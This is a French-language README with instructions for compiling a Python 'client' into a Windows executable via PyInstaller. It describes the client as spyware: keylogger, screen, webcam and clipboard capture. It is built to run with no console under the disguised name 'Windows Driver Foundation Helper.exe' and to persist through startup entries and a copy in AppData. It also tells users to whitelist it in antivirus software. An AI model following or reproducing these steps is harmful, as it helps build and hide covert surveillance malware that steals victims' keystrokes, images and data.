# Compilation du Client en Exécutable

Ce guide vous explique comment compiler le fichier `client.py` en exécutable Windows (.exe).

## Prérequis

- Python 3.7 ou plus récent installé
- pip (gestionnaire de paquets Python)
- Connexion Internet pour télécharger les dépendances

## Méthodes de Compilation

### Méthode 1 : Script Batch (Recommandé)

1. Ouvrez l'invite de commandes en tant qu'administrateur
2. Naviguez vers le dossier V0.8
3. Exécutez le script batch :
   ```cmd
   build.bat
   ```

### Méthode 2 : Script PowerShell

1. Ouvrez PowerShell en tant qu'administrateur
2. Naviguez vers le dossier V0.8
3. Exécutez le script PowerShell :
   ```powershell
   .\build.ps1
   ```

### Méthode 3 : Compilation Manuelle

1. Installez les dépendances :
   ```cmd
   pip install -r requirements.txt
   pip install pyinstaller
   ```

2. Compilez avec PyInstaller :
   ```cmd
   pyinstaller --clean client.spec
   ```

## Résultat

Après compilation réussie, vous trouverez l'exécutable dans le dossier `dist/` :
- **Nom du fichier** : `Windows Driver Foundation Helper.exe`
- **Taille** : Environ 50-100 MB (selon les dépendances)

## Configuration de l'Exécutable

L'exécutable est configuré pour :
- ✅ S'exécuter sans console visible (`console=False`)
- ✅ Utiliser l'icône Windows 11 si disponible
- ✅ Inclure toutes les dépendances nécessaires
- ✅ Optimiser la taille avec UPX
- ✅ Désactiver le mode debug pour de meilleures performances

## Dépendances Incluses

- `pyautogui` : Capture d'écran et automatisation
- `pywin32` : API Windows
- `psutil` : Informations système
- `pynput` : Keylogger
- `pyperclip` : Presse-papiers
- `opencv-python` : Capture webcam
- `winreg` : Registre Windows
- `ctypes` : Appels système
- `uuid` : Identifiants uniques

## Dépannage

### Erreur "Module not found"
- Vérifiez que toutes les dépendances sont installées
- Relancez la compilation après installation

### Erreur de permissions
- Exécutez l'invite de commandes en tant qu'administrateur

### Antivirus bloque l'exécutable
- Ajoutez une exception pour le dossier `dist/`
- L'exécutable peut être détecté comme malveillant à cause des fonctionnalités de keylogger

### Taille de l'exécutable trop importante
- Utilisez `--onefile` au lieu du fichier .spec pour un seul fichier
- Utilisez `--exclude-module` pour exclure des modules inutiles

## Notes Importantes

⚠️ **Avertissement** : Ce logiciel contient des fonctionnalités de surveillance qui peuvent être considérées comme malveillantes par les antivirus. Utilisez-le uniquement à des fins légitimes et avec autorisation appropriée.

🔒 **Sécurité** : L'exécutable sera automatiquement ajouté au démarrage Windows et copié dans AppData/Roaming pour la persistance.
